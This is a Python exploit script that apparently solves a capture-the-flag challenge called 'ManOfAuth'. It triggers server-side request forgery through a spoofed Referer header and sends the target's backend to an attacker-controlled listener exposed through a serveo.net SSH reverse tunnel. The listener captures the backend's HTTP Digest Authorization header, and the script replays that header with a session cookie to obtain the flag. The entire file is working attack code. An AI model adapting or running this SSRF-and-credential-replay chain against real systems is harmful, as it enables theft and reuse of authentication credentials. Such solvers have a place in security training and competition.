#!/usr/bin/env python3
import argparse
import http.server
import re
import socketserver
import subprocess
import sys
import threading
import time
from typing import Optional

import requests


FLAG_RE = re.compile(r"0xfun\{[^}]+\}")
URL_RE = re.compile(r"https://[A-Za-z0-9.-]+")


class TrapState:
    def __init__(self, realm: str, nonce: str, opaque: str) -> None:
        self.realm = realm
        self.nonce = nonce
        self.opaque = opaque
        self.captured_auth: Optional[str] = None
        self.lock = threading.Lock()

    def set_auth(self, value: str) -> None:
        with self.lock:
            if self.captured_auth is None:
                self.captured_auth = value

    def get_auth(self) -> Optional[str]:
        with self.lock:
            return self.captured_auth


def parse_digest_challenge(www_authenticate: str) -> tuple[str, str, str]:
    nonce_m = re.search(r'nonce="([^"]+)"', www_authenticate)
    opaque_m = re.search(r'opaque="([^"]+)"', www_authenticate)
    realm_m = re.search(r'realm="([^"]+)"', www_authenticate)
    if not (nonce_m and opaque_m and realm_m):
        raise ValueError(f"Could not parse digest challenge: {www_authenticate!r}")
    return realm_m.group(1), nonce_m.group(1), opaque_m.group(1)


def get_target_challenge(target_base: str) -> tuple[str, str, str, str]:
    url = f"{target_base.rstrip('/')}/auth"
    r = requests.get(url, timeout=15)
    r.raise_for_status() if r.status_code == 200 else None
    www = r.headers.get("WWW-Authenticate", "")
    realm, nonce, opaque = parse_digest_challenge(www)
    session_cookie = r.cookies.get("session")
    if not session_cookie:
        set_cookie = r.headers.get("Set-Cookie", "")
        m = re.search(r"session=([^;]+)", set_cookie)
        if m:
            session_cookie = m.group(1)
    if not session_cookie:
        raise RuntimeError("No Flask session cookie found in /auth response.")
    return realm, nonce, opaque, session_cookie


def make_handler(state: TrapState):
    class Handler(http.server.BaseHTTPRequestHandler):
        def log_message(self, fmt, *args):
            return

        def do_GET(self):
            auth = self.headers.get("Authorization", "")
            if auth.startswith("Digest "):
                state.set_auth(auth)
                print(f"[+] Captured backend digest header: {auth}")

            if self.path.startswith("/auth") and not auth.startswith("Digest "):
                self.send_response(401)
                self.send_header(
                    "WWW-Authenticate",
                    f'Digest realm="{state.realm}", nonce="{state.nonce}", '
                    f'opaque="{state.opaque}", algorithm="MD5", qop="auth"',
                )
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"need digest")
                return

            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"ok")

    return Handler


def start_local_trap(state: TrapState, port: int):
    handler = make_handler(state)
    server = socketserver.TCPServer(("127.0.0.1", port), handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


def start_serveo_tunnel(port: int, timeout: int) -> tuple[subprocess.Popen, str]:
    cmd = [
        "ssh",
        "-o",
        "StrictHostKeyChecking=no",
        "-o",
        "UserKnownHostsFile=/dev/null",
        "-o",
        "ExitOnForwardFailure=yes",
        "-o",
        "ServerAliveInterval=30",
        "-R",
        f"80:127.0.0.1:{port}",
        "serveo.net",
    ]
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
    )

    public_url = None
    deadline = time.time() + timeout
    while time.time() < deadline:
        if proc.stdout is None:
            break
        line = proc.stdout.readline()
        if line:
            line = line.strip()
            if line:
                print(f"[tunnel] {line}")
            m = URL_RE.search(line)
            if m and "serveousercontent.com" in m.group(0):
                public_url = m.group(0)
                break
        elif proc.poll() is not None:
            break
        else:
            time.sleep(0.1)

    if not public_url:
        proc.terminate()
        raise RuntimeError("Failed to obtain serveo public URL.")

    return proc, public_url


def trigger_ssrf(target_base: str, referer: str) -> None:
    url = f"{target_base.rstrip('/')}/api/check"
    r = requests.get(url, headers={"Referer": referer}, timeout=20)
    print(f"[*] /api/check status: {r.status_code} body: {r.text[:200]!r}")


def replay_and_get_flag(target_base: str, session_cookie: str, digest_auth: str) -> tuple[int, str, Optional[str]]:
    url = f"{target_base.rstrip('/')}/auth"
    headers = {
        "Authorization": digest_auth,
        "Cookie": f"session={session_cookie}",
    }
    r = requests.get(url, headers=headers, timeout=20)
    body = r.text
    m = FLAG_RE.search(body)
    return r.status_code, body, (m.group(0) if m else None)


def main():
    parser = argparse.ArgumentParser(description="ManOfAuth solver (SSRF + Digest replay)")
    parser.add_argument(
        "--target",
        default="http://chall.0xfun.org:12895",
        help="Target base URL (default: http://chall.0xfun.org:8406)",
    )
    parser.add_argument("--port", type=int, default=9001, help="Local trap port (default: 9001)")
    parser.add_argument("--tunnel-timeout", type=int, default=30, help="Seconds to wait for tunnel URL")
    parser.add_argument("--capture-timeout", type=int, default=20, help="Seconds to wait for captured digest header")
    args = parser.parse_args()

    trap_server = None
    tunnel_proc = None
    try:
        print(f"[*] Target: {args.target}")
        realm, nonce, opaque, session_cookie = get_target_challenge(args.target)
        print(f"[*] realm={realm}")
        print(f"[*] nonce={nonce}")
        print(f"[*] opaque={opaque}")
        print(f"[*] session={session_cookie}")

        state = TrapState(realm=realm, nonce=nonce, opaque=opaque)
        trap_server = start_local_trap(state, args.port)
        print(f"[*] Local digest trap started on 127.0.0.1:{args.port}")

        tunnel_proc, public_url = start_serveo_tunnel(args.port, args.tunnel_timeout)
        print(f"[*] Public tunnel URL: {public_url}")

        trigger_ssrf(args.target, public_url)

        deadline = time.time() + args.capture_timeout
        while time.time() < deadline:
            auth = state.get_auth()
            if auth:
                break
            time.sleep(0.2)
        else:
            raise RuntimeError("Timed out waiting for backend digest Authorization header.")

        digest_auth = state.get_auth()
        if not digest_auth:
            raise RuntimeError("No digest Authorization captured.")

        print("[*] Replaying captured digest header to target /auth ...")
        status, body, flag = replay_and_get_flag(args.target, session_cookie, digest_auth)
        print(f"[*] Replay response status: {status}")
        if flag:
            print(f"[+] FLAG: {flag}")
            return

        print("[-] No flag found in response.")
        print(body[:600])
        sys.exit(1)

    finally:
        if trap_server is not None:
            trap_server.shutdown()
            trap_server.server_close()
        if tunnel_proc is not None and tunnel_proc.poll() is None:
            tunnel_proc.terminate()
            try:
                tunnel_proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                tunnel_proc.kill()


if __name__ == "__main__":
    main()
